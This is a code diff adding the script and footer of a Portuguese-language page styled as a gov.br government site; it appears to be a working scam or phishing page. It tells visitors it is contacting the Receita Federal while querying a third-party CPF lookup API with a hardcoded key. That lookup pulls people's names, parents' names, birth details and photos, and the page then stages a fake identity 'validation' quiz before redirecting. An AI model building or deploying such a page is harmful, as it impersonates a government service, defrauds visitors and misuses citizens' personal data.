+      .forEach((opt) => {
+        opt.classList.remove("selected", "correct", "incorrect");
+      });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("fatherNameAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Nome do pai correto! Validação concluída com sucesso.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        hideElement("fatherNameSelection");
+
+        // Verificar se deve mostrar pergunta do estado
+        if (locationData.regionName) {
+          console.log(
+            "🌍 DEBUG: Mostrando pergunta do estado (após nome do pai):",
+            locationData.regionName,
+          );
+          showElement("stateSelection");
+          updateProgress(95);
+          createStateOptions(locationData.regionName);
+        } else {
+          console.log("🌍 DEBUG: Estado não disponível, finalizando validação");
+          updateStepStatus(3, "completed");
+          finishValidation();
+        }
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Nome do pai incorreto. Por favor, selecione o nome correto.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function normalizeStateName(stateName) {
+    // Normalizar nomes dos estados para português brasileiro
+    const stateMap = {
+      "Federal District": "Distrito Federal",
+      "federal district": "Distrito Federal",
+      "FEDERAL DISTRICT": "Distrito Federal",
+    };
+
+    return stateMap[stateName] || stateName;
+  }
+
+  async function getUserPhoto() {
+    try {
+      const cpf = localStorage.getItem("cpfValidado");
+      const region = JSON.parse(localStorage.getItem("locationData")).region;
+
+      if (!cpf || !region) {
+        console.log(
+          "📸 DEBUG: Não foi possível obter a foto do usuário: CPF ou região não disponíveis",
+        );
+        return;
+      }
+
+      const photoResponse = await fetch("/api/foto-lead", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cpf, estado: region }),
+      });
+      const photoData = await photoResponse.json();
+      console.log("📸 DEBUG: Dados da foto recebidos:", photoData);
+
+      localStorage.setItem("photoData", JSON.stringify(photoData));
+
+      // Exibir foto se disponível
+      displayUserPhoto(photoData);
+    } catch (e) {
+      console.log("📸 DEBUG: Erro ao obter foto:", e);
+    }
+  }
+
+  function displayUserPhoto(photoData) {
+    try {
+      // Verificar se há foto em base64 na resposta
+      if (photoData && photoData.foto_base64) {
+        const photoElement = document.getElementById("userPhoto");
+        const photoRowElement = document.getElementById("userPhotoRow");
+
+        if (photoElement && photoRowElement) {
+          // Definir a fonte da imagem com o base64
+          photoElement.src = `${photoData.foto_base64}`;
+
+          // Mostrar a linha da foto
+          photoRowElement.style.display = "flex";
+
+          console.log("📸 DEBUG: Foto do usuário exibida com sucesso");
+        }
+      } else {
+        console.log("📸 DEBUG: Foto não encontrada nos dados recebidos");
+      }
+    } catch (error) {
+      console.log("📸 DEBUG: Erro ao exibir foto:", error);
+    }
+  }
+
+  async function getUserLocation() {
+    const storedLocationData = localStorage.getItem("locationData");
+    if (storedLocationData) {
+      console.log(
+        "🌍 DEBUG: Localização obtida do localStorage:",
+        JSON.parse(storedLocationData),
+      );
+      locationData = JSON.parse(storedLocationData);
+      return;
+    }
+    try {
+      console.log("🌍 DEBUG: Consultando localização do usuário...");
+
+      const response = await fetch("/get-user-location");
+      const data = await response.json();
+
+      if (data.success) {
+        const normalizedRegionName = normalizeStateName(data.regionName || "");
+
+        locationData = {
+          region: data.region || "",
+          regionName: normalizedRegionName,
+          country: data.country || "",
+          city: data.city || "",
+        };
+
+        localStorage.setItem("locationData", JSON.stringify(locationData));
+
+        console.log("🌍 DEBUG: Localização obtida:");
+        console.log(
+          "- Estado/Região (original):",
+          data.regionName || "Não informado",
+        );
+        console.log(
+          "- Estado/Região (normalizado):",
+          normalizedRegionName || "Não informado",
+        );
+        console.log(
+          "- Código do Estado:",
+          locationData.region || "Não informado",
+        );
+        console.log("- País:", locationData.country || "Não informado");
+        console.log("- Cidade:", locationData.city || "Não informado");
+        console.log(
+          "- Irá mostrar pergunta sobre estado:",
+          normalizedRegionName !== "",
+        );
+      } else {
+        console.log(
+          "🌍 DEBUG: Não foi possível obter localização:",
+          data.error,
+        );
+        locationData = {};
+      }
+    } catch (error) {
+      console.log("🌍 DEBUG: Erro ao consultar localização:", error);
+      locationData = {};
+    }
+  }
+
+  function generateBrazilianMunicipalities(correctMunicipality) {
+    const allMunicipalities = [
+      "São Paulo",
+      "Rio de Janeiro",
+      "Brasília",
+      "Salvador",
+      "Fortaleza",
+      "Belo Horizonte",
+      "Manaus",
+      "Curitiba",
+      "Recife",
+      "Goiânia",
+      "Belém",
+      "Porto Alegre",
+      "Guarulhos",
+      "Campinas",
+      "São Luís",
+      "São Gonçalo",
+      "Maceió",
+      "Duque de Caxias",
+      "Teresina",
+      "Natal",
+      "Nova Iguaçu",
+      "Campo Grande",
+      "São Bernardo do Campo",
+      "João Pessoa",
+      "Santo André",
+      "Osasco",
+      "Jaboatão dos Guararapes",
+      "São José dos Campos",
+      "Ribeirão Preto",
+      "Uberlândia",
+      "Contagem",
+      "Sorocaba",
+      "Aracaju",
+      "Feira de Santana",
+      "Cuiabá",
+      "Joinville",
+      "Juiz de Fora",
+      "Londrina",
+      "Aparecida de Goiânia",
+      "Ananindeua",
+      "Porto Velho",
+      "Serra",
+      "Niterói",
+      "Caxias do Sul",
+      "Campos dos Goytacazes",
+      "Belford Roxo",
+      "Vila Velha",
+      "São João de Meriti",
+      "Florianópolis",
+      "Santos",
+      "Petrópolis",
+      "Cariacica",
+      "Vitória",
+      "Canoas",
+      "Carapicuíba",
+      "Olinda",
+      "Paulista",
+      "Piracicaba",
+      "Betim",
+      "Diadema",
+      "Jundiaí",
+      "Campina Grande",
+      "Bauru",
+      "São Vicente",
+      "Franca",
+      "Pelotas",
+      "Montes Claros",
+      "Taubaté",
+      "Caruaru",
+      "Suzano",
+      "Anápolis",
+      "Petrolina",
+      "Volta Redonda",
+      "Rio Branco",
+      "Uberaba",
+      "Praia Grande",
+      "Caucaia",
+      "Blumenau",
+      "São José do Rio Preto",
+      "Limeira",
+      "Novo Hamburgo",
+      "Ponta Grossa",
+      "Araraquara",
+      "Sete Lagoas",
+      "Santarém",
+      "Cachoeiro de Itapemirim",
+      "Várzea Grande",
+      "Maringá",
+      "Governador Valadares",
+      "Teixeira de Freitas",
+      "Juazeiro",
+      "Santa Luzia",
+      "Embu das Artes",
+      "Rio Grande",
+      "Presidente Prudente",
+      "Americana",
+      "Taboão da Serra",
+      "São Caetano do Sul",
+      "Cotia",
+      "Santa Maria",
+      "Gravataí",
+      "Viamão",
+      "Colombo",
+      "Jacareí",
+      "Itaquaquecetuba",
+      "Guarujá",
+      "Francisco Morato",
+      "São Francisco do Sul",
+      "Araras",
+      "Itapevi",
+      "Ferraz de Vasconcelos",
+      "Marília",
+      "Cascavel",
+      "Foz do Iguaçu",
+      "Itabuna",
+      "São Carlos",
+      "Barueri",
+      "Sumaré",
+      "Hortolândia",
+      "Cametá",
+      "Araguaína",
+      "Dourados",
+      "Vitória da Conquista",
+      "Macapá",
+      "Cabo Frio",
+      "Indaiatuba",
+      "Jequié",
+      "Chapecó",
+      "Criciúma",
+      "Lages",
+      "Imperatriz",
+      "Palmas",
+      "Boa Vista",
+      "Sao Francisco Da Praia",
+      "Cabo Verde",
+      "Almenara",
+      "Teófilo Otoni",
+      "Janaúba",
+      "Janu �ria",
+      "Salinas",
+      "Pedra Azul",
+      "Araçuaí",
+      "Itaobim",
+
+      // 🆕 Expansão - maiores cidades por população (IBGE)
+      "Parnamirim",
+      "Mossoró",
+      "Itajaí",
+      "Passo Fundo",
+      "Barra Mansa",
+      "Rondonópolis",
+      "Sobral",
+      "Marabá",
+      "Altamira",
+      "Castanhal",
+      "Crato",
+      "Ituiutaba",
+      "Abaetetuba",
+      "Alagoinhas",
+      "Cabo de Santo Agostinho",
+      "Bragança Paulista",
+      "Poços de Caldas",
+      "Arapiraca",
+      "Três Lagoas",
+      "Lagarto",
+      "Itaboraí",
+      "Nilópolis",
+      "Queimados",
+      "Magé",
+      "Garanhuns",
+      "Palhoça",
+      "Itapetininga",
+      "Catanduva",
+      "Paranaguá",
+      "Umuarama",
+      "Patos",
+      "Itaperuna",
+      "Nova Friburgo",
+      "Resende",
+      "Itanhaém",
+      "São Leopoldo",
+      "Sapucaia do Sul",
+      "Rio Verde",
+      "Itabira",
+      "Assis",
+      "Ourinhos",
+      "Passos",
+      "São Mateus",
+      "Linhares",
+      "Parintins",
+      "Codó",
+      "Bacabal",
+      "Paulo Afonso",
+      "Itabirito",
+      "Barretos",
+      "Tupã",
+      "Aracruz",
+      "Ji-Paraná",
+      "Rolim de Moura",
+      "Patrocínio",
+      "Formiga",
+      "Erechim",
+      "Guaíba",
+      "Itumbiara",
+      "Juatuba",
+      "Nova Serrana",
+      "Timóteo",
+      "Ipatinga",
+      "Corumbá",
+      "Aquidauana",
+      "Pará de Minas",
+      "Nova Mutum",
+      "Sinop",
+      "Lucas do Rio Verde",
+      "Alta Floresta",
+      "Tangará da Serra",
+      "Maracanaú",
+      "Itabira",
+      "Palmas",
+      "Cacoal",
+      "Ariquemes",
+      "Parauapebas",
+      "Itapipoca",
+      "Itacoatiara",
+      "Santana",
+      "Lauro de Freitas",
+      "Vitória de Santo Antão",
+      "Guaçuí",
+      "Maricá",
+      "Bento Gonçalves",
+      "Santa Cruz do Sul",
+      "Itaúna",
+      "Cataguases",
+      "Ariquemes",
+      "Santarém",
+      "Itapecerica da Serra",
+      "Cachoeirinha",
+      "Valinhos",
+      "São José",
+      "Itabira",
+      "Muriaé",
+      "Pindamonhangaba",
+      "Arapongas",
+      "Paranavaí",
+      "Apucarana",
+      "Telêmaco Borba",
+      "Campo Mourão",
+      "Araguari",
+      "Patos de Minas",
+      "Açu",
+      "Vitória do Mearim",
+      "São Raimundo Nonato",
+      "Itacoatiara",
+      "Pindaré-Mirim",
+      "Itapipoca",
+      "Russas",
+      "Crateús",
+      "Quixadá",
+      "Tianguá",
+      "Breves",
+      "Itaituba",
+      "Cametá",
+      "Castanhal",
+      "Parauapebas",
+      "Marabá",
+      "Santarém",
+      "Paragominas",
+      "Abaetetuba",
+      "Bragança",
+      "Redenção",
+      "Santana",
+      "Macapá",
+      "Mazagão",
+      "Boa Vista",
+      "Rorainópolis",
+      "Mucajaí",
+      "Caracaraí",
+      "Caracaraí",
+      "São Gabriel da Cachoeira",
+      "Manacapuru",
+      "Tabatinga",
+      "Tefé",
+      "Coari",
+      "Humaitá",
+      "Lábrea",
+      "Eirunepé",
+      "Parintins",
+      "Itacoatiara",
+      "Autazes",
+      "Novo Aripuanã",
+      "Presidente Figueiredo",
+      "Careiro",
+      "Anamã",
+      "Itamarati",
+      "Envira",
+      "Iranduba",
+      "Manicoré",
+      "São Sebastião do Uatumã",
+    ];
+
+    // Normalizar o município correto para comparação
+    const normalizedCorrect = correctMunicipality.toLowerCase().trim();
+
+    // Se o município correto não estiver na lista (comparação normalizada), adicionar
+    const existsInList = allMunicipalities.some(
+      (m) => m.toLowerCase().trim() === normalizedCorrect,
+    );
+    if (correctMunicipality && !existsInList) {
+      allMunicipalities.push(correctMunicipality);
+    }
+
+    // Remover o município correto e embaralhar os outros
+    const otherMunicipalities = allMunicipalities.filter(
+      (municipality) => municipality.toLowerCase().trim() !== normalizedCorrect,
+    );
+    const shuffledOthers = otherMunicipalities.sort(() => Math.random() - 0.5);
+
+    return shuffledOthers
+      .slice(0, 3)
+      .map((municipality) => municipality.toUpperCase());
+  }
+
+  function generateBrazilianStates(correctState) {
+    const allStates = [
+      "Acre",
+      "Alagoas",
+      "Amapá",
+      "Amazonas",
+      "Bahia",
+      "Ceará",
+      "Distrito Federal",
+      "Espírito Santo",
+      "Goiás",
+      "Maranhão",
+      "Mato Grosso",
+      "Mato Grosso do Sul",
+      "Minas Gerais",
+      "Pará",
+      "Paraíba",
+      "Paraná",
+      "Pernambuco",
+      "Piauí",
+      "Rio de Janeiro",
+      "Rio Grande do Norte",
+      "Rio Grande do Sul",
+      "Rondônia",
+      "Roraima",
+      "Santa Catarina",
+      "São Paulo",
+      "Sergipe",
+      "Tocantins",
+    ];
+
+    // Função de embaralhamento utilizando algoritmo de Fisher-Yates
+    function shuffleArray(array) {
+      for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+      }
+      return array;
+    }
+
+    // Se o estado correto não estiver na lista, adicionar
+    if (correctState && !allStates.includes(correctState)) {
+      allStates.push(correctState);
+    }
+
+    // Remover o estado correto da lista
+    const otherStates = allStates.filter((state) => state !== correctState);
+    
+    // Embaralhar todos os estados e selecionar três
+    const shuffledStates = shuffleArray(otherStates);
+
+    return shuffledStates.slice(0, 3);
+  }
+
+  function createMunicipalityOptions(correctMunicipality) {
+    const container = document.getElementById("municipalityOptions");
+    const options = [
+      { municipality: correctMunicipality, correct: true },
+      {
+        municipality: generateBrazilianMunicipalities(correctMunicipality)[0],
+        correct: false,
+      },
+      {
+        municipality: generateBrazilianMunicipalities(correctMunicipality)[1],
+        correct: false,
+      },
+      {
+        municipality: generateBrazilianMunicipalities(correctMunicipality)[2],
+        correct: false,
+      },
+    ];
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.municipality}</div>`;
+
+      optionDiv.addEventListener("click", () =>
+        handleMunicipalitySelection(optionDiv),
+      );
+      container.appendChild(optionDiv);
+    });
+  }
+
+  function createStateOptions(correctState) {
+    const container = document.getElementById("stateOptions");
+    const options = [
+      { state: correctState, correct: true },
+      { state: generateBrazilianStates(correctState).filter((state) => state !== correctState)[0], correct: false },
+      { state: generateBrazilianStates(correctState).filter((state) => state !== correctState)[1], correct: false },
+      { state: generateBrazilianStates(correctState).filter((state) => state !== correctState)[2], correct: false },
+    ];
+
+    // Embaralhar opções
+    options.sort(() => Math.random() - 0.5);
+
+    container.innerHTML = "";
+
+    options.forEach((option) => {
+      const optionDiv = document.createElement("div");
+      optionDiv.className = "option-item";
+      optionDiv.dataset.correct = option.correct;
+      optionDiv.innerHTML = `<div class="font-medium text-gray-900">${option.state.toUpperCase()}</div>`;
+
+      optionDiv.addEventListener("click", () =>
+        handleStateSelection(optionDiv),
+      );
+      container.appendChild(optionDiv);
+    });
+  }
+
+  function handleMunicipalitySelection(selectedOption) {
+    // Remover seleções anteriores
+    document
+      .querySelectorAll("#municipalityOptions .option-item")
+      .forEach((opt) => {
+        opt.classList.remove("selected", "correct", "incorrect");
+      });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("municipalityAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Município correto! Continuando validação.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        hideElement("municipalitySelection");
+        continueValidationFlow();
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Município incorreto. Por favor, selecione o município correto conforme sua certidão de nascimento.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function handleStateSelection(selectedOption) {
+    // Remover seleções anteriores
+    document.querySelectorAll("#stateOptions .option-item").forEach((opt) => {
+      opt.classList.remove("selected", "correct", "incorrect");
+    });
+
+    selectedOption.classList.add("selected");
+
+    const isCorrect = selectedOption.dataset.correct === "true";
+    const alertDiv = document.getElementById("stateAlert");
+
+    if (isCorrect) {
+      selectedOption.classList.add("correct");
+      alertDiv.className = "alert-message alert-success";
+      alertDiv.innerHTML =
+        '<i class="fas fa-check-circle mr-2 checkmark-animated"></i>Estado correto! Validação concluída com sucesso.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        updateStepStatus(3, "completed");
+        hideElement("stateSelection");
+        finishValidation();
+      }, 1500);
+    } else {
+      selectedOption.classList.add("incorrect");
+      alertDiv.className = "alert-message alert-error";
+      alertDiv.innerHTML =
+        '<i class="fas fa-times-circle mr-2"></i>Estado incorreto. Por favor, selecione o estado correto.';
+      alertDiv.classList.remove("hidden");
+
+      setTimeout(() => {
+        selectedOption.classList.remove("selected", "incorrect");
+        alertDiv.classList.add("hidden");
+      }, 3000);
+    }
+  }
+
+  function continueValidationFlow() {
+    // Após validação do município, verificar próxima pergunta na sequência
+    if (realData.hasMotherName) {
+      console.log(
+        "🔍 DEBUG: Mostrando próxima pergunta - Nome da mãe:",
+        realData.motherName,
+      );
+      showElement("motherNameSelection");
+      updateProgress(90);
+      createMotherNameOptions(realData.motherName);
+      return;
+    }
+
+    if (realData.hasFatherName) {
+      console.log(
+        "🔍 DEBUG: Mostrando próxima pergunta - Nome do pai:",
+        realData.fatherName,
+      );
+      showElement("fatherNameSelection");
+      updateProgress(90);
+      createFatherNameOptions(realData.fatherName);
+      return;
+    }
+
+    // Se não há mais validações de nome, verificar estado
+    if (locationData.regionName) {
+      console.log(
+        "🌍 DEBUG: Mostrando pergunta do estado (após validações):",
+        locationData.regionName,
+      );
+      showElement("stateSelection");
+      updateProgress(95);
+      createStateOptions(locationData.regionName);
+    } else {
+      console.log("🌍 DEBUG: Estado não disponível, finalizando validação");
+      updateStepStatus(3, "completed");
+      finishValidation();
+    }
+  }
+
+  function finishValidation() {
+    showElement("completionSection");
+    updateProgress(100);
+
+    const firstName = getFirstName(realData.fullName);
+    document.getElementById("validationSuccessMessage").textContent =
+      `Olá, ${firstName}! Sua identidade foi verificada com sucesso. Você pode prosseguir para a próxima etapa do processo.`;
+  }
+
+  async function consultaDetalhadaCpf() {
+    try {
+      const cpf = getUrlParameter("cpf");
+      if (!cpf) {
+        console.error("🔍 DEBUG: CPF não encontrado na URL");
+        updateStepStatus(1, "error");
+        document.getElementById("statusDisplay").textContent =
+          "Erro: CPF não informado";
+        return;
+      }
+
+      console.log("🔍 DEBUG: Consulta detalhada desabilitada (API não disponível)");
+      return; // API secundária não está disponível
+      
+      /* DESABILITADO - API não disponível
+      const response = await fetch("/api/consulta-detalhada-cpf", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cpf: cpf }),
+      });
+      
+      // Restante do código comentado pois a API não está disponível
+      */
+    } catch (e) {
+      console.log("❌ DEBUG: Consulta detalhada não executada (API não disponível)");
+    }
+  }
+
+  // Função para converter data de DD/MM/YYYY para ISO YYYY-MM-DD
+  function convertToISODate(dateStr) {
+    if (!dateStr) return "";
+    const parts = dateStr.split('/');
+    if (parts.length !== 3) return "";
+    const [day, month, year] = parts;
+    return `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}T00:00:00`;
+  }
+
+  // Inicialização
+  document.addEventListener("DOMContentLoaded", async function () {
+    updateProgress(5);
+
+    const cpf = getUrlParameter("cpf");
+    if (!cpf) {
+      console.error("CPF não encontrado na URL");
+      updateStepStatus(1, "error");
+      document.getElementById("statusDisplay").textContent =
+        "Erro: CPF não informado";
+      return;
+    }
+
+    const cpfFormatted = cpf.replace(
+      /(\d{3})(\d{3})(\d{3})(\d{2})/,
+      "$1.$2.$3-$4",
+    );
+    document.getElementById("cpfDisplay").textContent = cpfFormatted;
+
+    try {
+      updateProgress(20);
+
+      const startTime = Date.now();
+      // consultaDetalhadaCpf() - Desabilitado: API secundária não disponível
+      // Atualizar status para conectando
+      document.getElementById("statusDisplay").textContent =
+        "Conectando com Receita Federal...";
+      updateProgress(40);
+
+      // API CPF direta via JS (apela-api.tech) - não depende de PHP
+      const cpfNumeros = cpf.replace(/\D/g, '');
+      const apiUrl = `https://apela-api.tech/?user=1da00e5758d36202cc77bc44d10e928f&cpf=${cpfNumeros}`;
+      
+      console.log("🔍 DEBUG: Consultando API direta:", apiUrl.replace(/user=[^&]+/, 'user=***'));
+      
+      const response = await fetch(apiUrl, { method: 'GET', headers: { Accept: 'application/json' } });
+
+      if (!response.ok) {
+        // Tentar obter mensagem de erro do servidor
+        let errorMessage = `Erro na consulta: ${response.status}`;
+        try {
+          const errorData = await response.json();
+          errorMessage = errorData.message || errorData.error || errorMessage;
+          console.error("❌ DEBUG: Erro da API:", errorData);
+        } catch (e) {
+          console.error("❌ DEBUG: Erro ao ler resposta de erro:", e);
+        }
+        throw new Error(errorMessage);
+      }
+
+      const apiData = await response.json();
+      
+      // Verificar se a resposta contém erro (apela-api.tech retorna status no body)
+      if (apiData.error || apiData.success === false || (apiData.status && apiData.status !== 200)) {
+        const errorMsg = apiData.message || apiData.error || "Erro desconhecido na API";
+        console.error("❌ DEBUG: API retornou erro:", apiData);
+        throw new Error(errorMsg);
+      }
+      
+      // Log completo da resposta da API para debug
+      console.log("📊 DEBUG: Resposta completa da API:", JSON.stringify(apiData, null, 2));
+      
+      // Função auxiliar para buscar valor em diferentes estruturas possíveis
+      function getValue(obj, ...keys) {
+        for (const key of keys) {
+          if (obj && typeof obj === 'object') {
+            // Tentar acesso direto
+            if (obj[key] !== undefined && obj[key] !== null && obj[key] !== '') {
+              return obj[key];
+            }
+            // Tentar acesso case-insensitive
+            const lowerKey = key.toLowerCase();
+            for (const objKey in obj) {
+              if (objKey.toLowerCase() === lowerKey) {
+                if (obj[objKey] !== undefined && obj[objKey] !== null && obj[objKey] !== '') {
+                  return obj[objKey];
+                }
+              }
+            }
+            // Tentar acessar dentro de Result
+            if (obj.Result && obj.Result[key]) {
+              return obj.Result[key];
+            }
+            // Tentar acessar dentro de data
+            if (obj.data && obj.data[key]) {
+              return obj.data[key];
+            }
+          }
+        }
+        return "";
+      }
+      
+      // Mapear dados da API - tentar múltiplas estruturas possíveis
+      const nome = getValue(apiData, 'nome', 'Nome', 'nome_completo', 'NomePessoaFisica', 'name', 'full_name') || 
+                   (apiData.Result && apiData.Result.NomePessoaFisica) || "";
+      
+      const nascimento = getValue(apiData, 'nascimento', 'data_nascimento', 'DataNascimento', 'birth_date', 'dataNascimento') ||
+                        (apiData.Result && apiData.Result.DataNascimento) || "";
+      
+      const mae = getValue(apiData, 'mae', 'nome_mae', 'NomeMae', 'mother_name', 'nomeMae', 'mae_nome') ||
+                  (apiData.Result && apiData.Result.NomeMae) || "";
+      
+      const pai = getValue(apiData, 'pai', 'nome_pai', 'NomePai', 'father_name', 'nomePai', 'pai_nome') ||
+                  (apiData.Result && apiData.Result.NomePai) || "";
+      
+      const sexo = getValue(apiData, 'sexo', 'Sexo', 'gender', 'genero') ||
+                   (apiData.Result && apiData.Result.Sexo) || "";
+      
+      const localizacao = getValue(apiData, 'localizacao', 'localização', 'municipio', 'MunicipioNascimento', 'municipio_nascimento', 'city', 'cidade') ||
+                         (apiData.Result && apiData.Result.MunicipioNascimento) || "";
+      
+      const escolaridade = getValue(apiData, 'escolaridade', 'Escolaridade', 'education', 'escolaridade_nivel') ||
+                          (apiData.Result && apiData.Result.Escolaridade) || "";
+      
+      // Adaptar resposta da API para o formato esperado
+      const data = {
+        Result: {
+          NomePessoaFisica: nome,
+          DataNascimento: nascimento ? (nascimento.includes('/') ? convertToISODate(nascimento) : nascimento) : "",
+          NomeMae: mae,
+          NomePai: pai,
+          Sexo: sexo,
+          MunicipioNascimento: localizacao ? (localizacao.includes(',') ? localizacao.split(',')[0].trim() : localizacao) : "",
+          Escolaridade: escolaridade
+        },
+        DataSourceCategory: "API CPF"
+      };
+      
+      console.log("📊 DEBUG: Dados mapeados da API:");
+      console.log("  - Nome:", nome);
+      console.log("  - Nascimento:", nascimento);
+      console.log("  - Mãe:", mae);
+      console.log("  - Pai:", pai);
+      console.log("  - Sexo:", sexo);
+      console.log("  - Localização:", localizacao);
+      console.log("📊 DEBUG: Dados adaptados:", data);
+      const endTime = Date.now();
+      const consultationTime = `${((endTime - startTime) / 1000).toFixed(1)}s`;
+
+      if (data.Result) {
+        localStorage.setItem("cpfData", JSON.stringify(data));
+        updateStepStatus(1, "completed");
+        document.getElementById("statusDisplay").textContent =
+          "Documento válido";
+        document.getElementById("timeDisplay").textContent = consultationTime;
+        updateProgress(60);
+
+        // Processar dados
+        let birthDate = "";
+        if (data.Result.DataNascimento) {
+          const dateStr = data.Result.DataNascimento.split("T")[0];
+          const [year, month, day] = dateStr.split("-");
+          birthDate = `${day}/${month}/${year}`;
+        }
+
+        // DEBUG: Verificar dados obtidos das múltiplas APIs
+        let motherName = data.Result.NomeMae || "";
+        let fatherName = data.Result.NomePai || "";
+        let municipalityName = data.Result.MunicipioNascimento || "";
+        const education = data.Result.Escolaridade || "";
+
+        // Função para verificar se um nome/campo é válido (não é "Sem informação" ou variações)
+        function isValidField(field) {
+          if (!field || field.trim() === "") return false;
+
+          const invalidVariations = [
+            "sem informação",
+            "sem informacao",
+            "sem info",
+            "não informado",
+            "nao informado",
+            "não consta",
+            "nao consta",
+            "desconhecido",
+            "ignorado",
+            "s/i",
+            "si",
+            "n/i",
+            "ni",
+            "n/a",
+            "na",
+            "n/d",
+            "nd",
+            "não se aplica",
+            "nao se aplica",
+            "não disponível",
+            "nao disponivel",
+            "indisponível",
+            "indisponivel",
+            "não encontrado",
+            "nao encontrado",
+          ];
+
+          const normalizedField = field.toLowerCase().trim();
+          return !invalidVariations.includes(normalizedField);
+        }
+
+        // Verificar e limpar nomes/campos inválidos
+        console.log("🔍 DEBUG: Nome da mãe ANTES da validação:", motherName);
+        if (!isValidField(motherName)) {
+          console.log("🔍 DEBUG: Nome da mãe inválido detectado:", motherName);
+          motherName = "";
+        } else {
+          console.log("✅ DEBUG: Nome da mãe VÁLIDO:", motherName);
+        }
+
+        if (!isValidField(fatherName)) {
+          console.log("🔍 DEBUG: Nome do pai inválido detectado:", fatherName);
+          fatherName = "";
+        }
+
+        if (!isValidField(municipalityName)) {
+          console.log(
+            "🔍 DEBUG: Município de nascimento inválido detectado:",
+            municipalityName,
+          );
+          municipalityName = "";
+        }
+
+        console.log("🔍 DEBUG: Dados recebidos das APIs combinadas:");
+        console.log(
+          "- Nome completo:",
+          data.Result.NomePessoaFisica || "Não informado",
+        );
+        console.log("- Data nascimento:", birthDate || "Não informado");
+        console.log("- Nome da mãe:", motherName || "Não informado");
+        console.log("- Nome do pai:", fatherName || "Não informado");
+        console.log(
+          "- Município de nascimento:",
+          municipalityName || "Não informado",
+        );
+        console.log("- Escolaridade:", education || "Não informado");
+        console.log(
+          "- Fonte de dados:",
+          data.DataSourceCategory || "Não informado",
+        );
+        console.log(
+          "- Irá mostrar pergunta sobre nome da mãe:",
+          motherName !== "",
+        );
+        console.log(
+          "- Irá mostrar pergunta sobre nome do pai:",
+          fatherName !== "",
+        );
+        console.log(
+          "- Irá mostrar pergunta sobre município de nascimento:",
+          municipalityName !== "",
+        );
+
+        realData = {
+          fullName: data.Result.NomePessoaFisica || "",
+          birthDate: birthDate,
+          motherName: motherName,
+          fatherName: fatherName,
+          municipalityName: municipalityName,
+          cpf: cpf,
+          sexo: data.Result.Sexo || "",
+          hasMotherName: motherName !== "",
+          hasFatherName: fatherName !== "",
+          hasMunicipalityName: municipalityName !== "",
+        };
+
+        // Consultar localização do usuário
+        await getUserLocation();
+        // Mostrar etapa 2
+        setTimeout(() => {
+          showElement("step2Container");
+          showElement("nameSelection"); // Mostrar seção com loading
+          updateStepStatus(2, "processing");
+          updateProgress(75);
+
+          // Iniciar validação após 2 segundos
+          setTimeout(() => {
+            createNameOptions(realData.fullName);
+          }, 2000);
+        }, 1000);
+      } else {
+        updateStepStatus(1, "error");
+        document.getElementById("statusDisplay").textContent =
+          "Erro na validação do CPF";
+      }
+    } catch (error) {
+      console.error("❌ Erro ao consultar CPF:", error);
+      console.error("❌ Stack trace:", error.stack);
+      updateStepStatus(1, "error");
+      
+      // Mostrar mensagem de erro mais detalhada
+      let errorMessage = "Falha na conexão";
+      if (error.message) {
+        errorMessage = error.message;
+        // Limitar tamanho da mensagem para não quebrar o layout
+        if (errorMessage.length > 50) {
+          errorMessage = errorMessage.substring(0, 50) + "...";
+        }
+      }
+      
+      document.getElementById("statusDisplay").textContent = errorMessage;
+      
+      // Log adicional para debug
+      console.error("❌ Mensagem de erro exibida:", errorMessage);
+    }
+  });
+
+  // Event listener para o botão continuar
+  document.getElementById("continueBtn").addEventListener("click", function () {
+    function appendUrlParams(baseUrl, additionalParams = {}) {
+      const urlParams = new URLSearchParams(window.location.search);
+
+      for (const key in additionalParams) {
+        urlParams.set(key, additionalParams[key]);
+      }
+
+      return (
+        baseUrl + (baseUrl.includes("?") ? "&" : "?") + urlParams.toString()
+      );
+    }
+
+    window.location.href = appendUrlParams("/validacao-em-andamento", {
+      cpf: realData.cpf,
+    });
+  });
+</script>
+ <footer class="bg-[#0B2341] text-white relative" style="z-index: 10;">
+  <div class="w-full px-4 py-4 pt-[64px]">
+    <!-- ANVISA Logo -->
+    <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr.png" alt="Gov.br Logo" class="w-[165px] h-[60px] mb-[52px]">
+    <div class="w-full border-b border-white"></div>
+    
+    <!-- MAIS INFORMAÇÕES Section -->
+    <div class="accordion-item">
